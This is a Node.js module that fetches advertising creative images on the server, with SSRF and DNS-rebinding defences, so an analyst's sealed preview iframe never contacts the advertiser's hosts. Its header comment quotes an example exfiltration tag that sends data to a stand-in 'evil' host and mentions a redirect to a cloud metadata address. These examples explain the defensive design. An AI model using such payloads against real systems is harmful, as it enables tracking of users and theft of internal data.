'use strict';

/**
 * lib/asset-fetch.js — fetch one creative asset on the server's behalf, so the
 * analyst's browser never touches the advertiser's origin.
 *
 * ── Why this exists ──────────────────────────────────────────────────────
 * The creative preview iframe carries a deliberately sealed CSP
 * (`img-src data: blob:`), and it must stay sealed: that iframe is not a
 * viewer, it is the measurement chamber creative-probe.js reports from.
 * Letting it load `https:` images would mean every tracking pixel in an
 * attacker-supplied creative fires from the analyst's machine — leaking
 * their IP and User-Agent to the very network they are investigating,
 * telling a fraudster their creative is under analysis, and turning
 * `<img src="https://evil/?leak=…">` into a working exfiltration channel.
 * It would also stop the probe from detecting an attempt, because the
 * attempt would simply succeed.
 *
 * So the bytes are fetched HERE, by the server, and handed to the page as a
 * `data:` URI. The seal holds, and the picture still renders.
 *
 * ── SSRF posture ─────────────────────────────────────────────────────────
 * The URL comes from a payload someone pasted, so it is hostile input
 * pointed at our own network. modules/proxy solves this with a hard-coded
 * host allow-list, which cannot work here — creative CDNs are arbitrary by
 * nature. Instead:
 *
 *   1. scheme must be http/https; port must be default or 80/443 (closes
 *      the port-scan side channel the proxy audit found).
 *   2. every address the hostname resolves to is checked against
 *      isPrivateIp — loopback, RFC1918, link-local, CGNAT, ULA. One private
 *      answer rejects the whole name; a round-robin that mixes public and
 *      private is a rebinding attempt, not a CDN.
 *   3. the connection is then made TO THE RESOLVED IP, carrying the
 *      original hostname as `Host` and TLS `servername`. Resolving once and
 *      connecting by name would leave a window where the second lookup
 *      returns 127.0.0.1 — the classic DNS-rebinding TOCTOU. Connecting by
 *      IP closes it, and SNI keeps certificate validation honest.
 *   4. redirects are NOT followed. A 302 to 169.254.169.254 is the oldest
 *      trick there is, and re-validating a hop costs more code than telling
 *      the caller the asset moved.
 *   5. response must be image/*, under a byte cap, inside a timeout.
 *
 * Nothing about the request identifies the analyst: no cookies, no referer,
 * no forwarded headers. The advertiser sees this server asking for a file.
 */

const http = require('http');
const https = require('https');
const dns = require('dns').promises;
const { isPrivateIp, normalizeIp } = require('./traffic-class');

const MAX_ASSET_BYTES = Number(process.env.ASSET_MAX_BYTES) || 2 * 1024 * 1024;
const ASSET_TIMEOUT_MS = Number(process.env.ASSET_TIMEOUT_MS) || 8000;
const ALLOWED_PORTS = new Set(['', '80', '443']);
const ALLOWED_SCHEMES = new Set(['http:', 'https:']);

/** Image types worth rendering. SVG is excluded on purpose — it is script. */
const ALLOWED_TYPES = new Set([
  'image/png',
  'image/jpeg',
  'image/jpg',
  'image/gif',
  'image/webp',
  'image/avif',
  'image/bmp',
  'image/x-icon',
  'image/vnd.microsoft.icon',
]);

function fail(code, message) {
  return Object.assign(new Error(message), { code });
}

/**
 * Parse and structurally validate the URL before any network work.
 * @param {string} raw
 * @returns {URL}
 */
function parseAssetUrl(raw) {
  let u;
  try {
    u = new URL(String(raw));
  } catch (_) {
    throw fail('url_invalid', 'Not a URL');
  }
  if (!ALLOWED_SCHEMES.has(u.protocol)) throw fail('scheme_blocked', 'Only http/https');
  if (!ALLOWED_PORTS.has(u.port)) throw fail('port_blocked', 'Only default ports');
  if (!u.hostname) throw fail('url_invalid', 'No host');
  return u;
}

/**
 * Resolve the hostname and return one safe address to connect to.
 * Rejects if ANY answer is private — see the header, point 2.
 *
 * @param {string} hostname
 * @returns {Promise<{address: string, family: number}>}
 */
async function resolveSafely(hostname) {
  // WHATWG URL keeps the brackets on an IPv6 literal, and `[::1]` is not a
  // name any resolver knows — so a bracketed literal would have been rejected
  // only because the lookup happened to fail, which is luck, not a guard.
  // Strip them and let the private-range check do its job on the address.
  const bare = /^\[.*\]$/.test(hostname) ? hostname.slice(1, -1) : hostname;

  const literal = normalizeIp(bare);
  if (literal && /^[0-9.]+$/.test(bare.replace(/^::ffff:/i, '')) === false && bare.includes(':')) {
    // IPv6 literal — no resolution involved, check it directly.
    if (isPrivateIp(literal)) throw fail('host_blocked', 'Host is a private address');
    return { address: bare, family: 6 };
  }

  let answers;
  try {
    answers = await dns.lookup(bare, { all: true, verbatim: true });
  } catch (_) {
    throw fail('dns_failed', 'Host does not resolve');
  }
  if (!answers.length) throw fail('dns_failed', 'Host does not resolve');
  for (const a of answers) {
    const norm = normalizeIp(a.address);
    if (!norm || isPrivateIp(norm)) {
      throw fail('host_blocked', 'Host resolves to a private address');
    }
  }
  return answers[0];
}

/**
 * Fetch one image. Resolves to { contentType, buffer } or throws a coded error.
 *
 * @param {string} rawUrl
 * @returns {Promise<{contentType: string, buffer: Buffer, bytes: number}>}
 */
async function fetchAsset(rawUrl) {
  const u = parseAssetUrl(rawUrl);
  const { address, family } = await resolveSafely(u.hostname);
  const isHttps = u.protocol === 'https:';
  const lib = isHttps ? https : http;

  return new Promise((resolve, reject) => {
    const req = lib.request(
      {
        // Connect to the ADDRESS, not the name — closes the rebinding window.
        host: address,
        family,
        port: u.port || (isHttps ? 443 : 80),
        path: u.pathname + u.search,
        method: 'GET',
        // SNI + certificate identity still check the real hostname.
        servername: isHttps ? u.hostname : undefined,
        headers: {
          Host: u.hostname,
          Accept: 'image/*',
          // A neutral agent. No cookies, no referer, nothing about the user.
          'User-Agent': 'ortbtools-asset-fetch/1',
        },
        timeout: ASSET_TIMEOUT_MS,
      },
      (res) => {
        const status = res.statusCode || 0;
        if (status >= 300 && status < 400) {
          res.destroy();
          return reject(fail('redirect_blocked', 'Asset redirects; not followed'));
        }
        if (status !== 200) {
          res.destroy();
          return reject(fail('upstream_status', 'Upstream returned ' + status));
        }
        const ctype = String(res.headers['content-type'] || '')
          .split(';')[0]
          .trim()
          .toLowerCase();
        if (!ALLOWED_TYPES.has(ctype)) {
          res.destroy();
          return reject(fail('type_blocked', 'Not a renderable image: ' + (ctype || 'unknown')));
        }

        const chunks = [];
        let total = 0;
        res.on('data', (c) => {
          total += c.length;
          if (total > MAX_ASSET_BYTES) {
            res.destroy();
            return reject(fail('too_large', 'Asset exceeds the size cap'));
          }
          chunks.push(c);
        });
        res.on('end', () =>
          resolve({ contentType: ctype, buffer: Buffer.concat(chunks), bytes: total }),
        );
        res.on('error', () => reject(fail('upstream_failed', 'Upstream stream error')));
      },
    );

    req.on('timeout', () => {
      req.destroy();
      reject(fail('timeout', 'Upstream timed out'));
    });
    req.on('error', () => reject(fail('upstream_failed', 'Could not reach the asset')));
    req.end();
  });
}

module.exports = { fetchAsset, parseAssetUrl, resolveSafely, MAX_ASSET_BYTES, ALLOWED_TYPES };
